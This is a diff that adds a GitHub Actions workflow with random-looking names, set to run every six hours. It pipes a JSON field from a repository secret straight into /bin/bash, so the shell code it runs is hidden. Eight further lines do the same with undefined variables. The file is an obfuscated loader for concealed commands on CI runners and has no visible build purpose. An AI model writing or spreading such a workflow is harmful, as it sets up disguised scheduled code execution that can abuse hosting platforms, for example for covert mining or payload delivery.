@@ -1,0 +1,24 @@
+name: wisdomradish
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '55 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: wisdomradish
+        env:
+          cwi58: ${{ secrets.cwi58 }}
+        run: |
+          echo $cwi58 | jq -r .inu27703 | /bin/bash
+          echo $jlum0976 | jq -r .wmf50584 | /bin/bash
+          echo $rqs763 | jq -r .l15384 | /bin/bash
+          echo $om77 | jq -r .jfg03 | /bin/bash
+          echo $kgry27 | jq -r .qhrug2 | /bin/bash
+          echo $sjgsf31 | jq -r .gxy161 | /bin/bash
+          echo $n1857 | jq -r .jtgod9 | /bin/bash
+          echo $nvlz7754 | jq -r .kxz32 | /bin/bash
+          echo $c0 | jq -r .qg78232 | /bin/bash
+
